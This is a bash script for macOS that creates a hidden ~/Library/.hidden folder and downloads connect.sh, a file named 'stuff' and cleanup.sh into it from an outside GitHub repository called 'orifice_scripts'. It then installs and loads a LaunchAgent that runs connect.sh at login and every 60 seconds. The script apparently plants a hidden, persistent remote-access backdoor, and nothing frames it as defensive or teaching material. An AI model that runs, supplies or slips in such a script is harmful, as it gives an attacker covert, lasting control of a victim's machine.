#!/bin/bash
mkdir ~/Library/.hidden;
mkdir ~/Library/LaunchAgents;

wget -O ~/Library/.hidden/connect.sh https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/connect.sh;
chmod +x ~/Library/.hidden/connect.sh;
wget -O ~/Library/.hidden/stuff https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/stuff.txt;
wget -O ~/Library/.hidden/cleanup.sh https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/cleanup.sh;
chmod +x ~/Library/.hidden/cleanup.sh;

echo '<plist version="1.0">
<dict>
<key>Label</key>
<string>com.gnerdsec.orifice</string>
<key>ProgramArguments</key>
<array>
<string>/bin/sh</string>
<string>'$HOME'/Library/.hidden/connect.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartInterval</key>
<integer>60</integer>
<key>AbandonProcessGroup</key>
<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.gnerdsec.orifice.plist;

chmod 600 ~/Library/LaunchAgents/com.gnerdsec.orifice.plist;

launchctl load ~/Library/LaunchAgents/com.gnerdsec.orifice.plist
